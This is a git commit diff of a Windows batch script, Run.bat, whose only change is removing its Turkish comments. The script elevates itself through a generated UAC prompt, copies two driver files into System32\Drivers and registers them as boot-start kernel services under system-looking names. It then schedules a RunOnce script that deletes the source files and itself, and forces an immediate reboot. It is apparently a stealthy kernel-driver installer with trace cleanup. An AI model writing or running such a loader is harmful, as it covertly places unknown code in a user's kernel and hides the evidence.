b46df966aace810a5a493ac1369a45992b901fce
lofty1337902 <yildizlarsahitaskima1337@gmail.com>
2025-12-27 22:55:55 +0300

    Run.bat

--- Run.bat
+++ Run.bat
@@ -1,7 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Yönetici izni kontrolü
 openfiles >nul 2>&1 || (
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
@@ -9,7 +8,6 @@ openfiles >nul 2>&1 || (
     exit /B
 )
 
-:: System32\Drivers klasörüne kopyalama
 set "system32Dir=C:\Windows\System32\Drivers"
 
 if exist "%~dp0kvmhookx.sys" (
@@ -20,15 +18,9 @@ if exist "%~dp0xinputv1a.sys" (
     copy /y "%~dp0xinputv1a.sys" "%system32Dir%"
 )
 
-:: Servisleri oluştur
 sc create kvmhookx binPath= "C:\Windows\System32\Drivers\kvmhookx.sys" DisplayName= "kvmhookx" start= boot tag= 1 type= kernel group= "System Reserved" >nul 2>&1
 sc create xinputv1a binPath= "C:\Windows\System32\Drivers\xinputv1a.sys" DisplayName= "xinputv1a" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 
-:: ======================
-:: YENİDEN BAŞLATMA SONRASI DOSYALARI SİLECEK SCRIPT
-:: ======================
-
-:: Bulunduğu dizini al
 set "CURRENT_DIR=%~dp0"
 set "CLEANER=%TEMP%\clean_after_reboot.bat"
 
@@ -41,7 +33,6 @@ echo del /f /q "!CURRENT_DIR!xinputv1a.sys"
 echo del "%%~f0"
 ) > "!CLEANER!"
 
-:: Sadece bir kere çalışacak şekilde RunOnce'a ekle
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v CleanDrivers /t REG_SZ /d "!CLEANER!" /f
 
 powershell -c "[console]::beep(1000,2000)"
@@ -50,3 +41,4 @@ shutdown /r /f /t 0
 
 
 exit
+
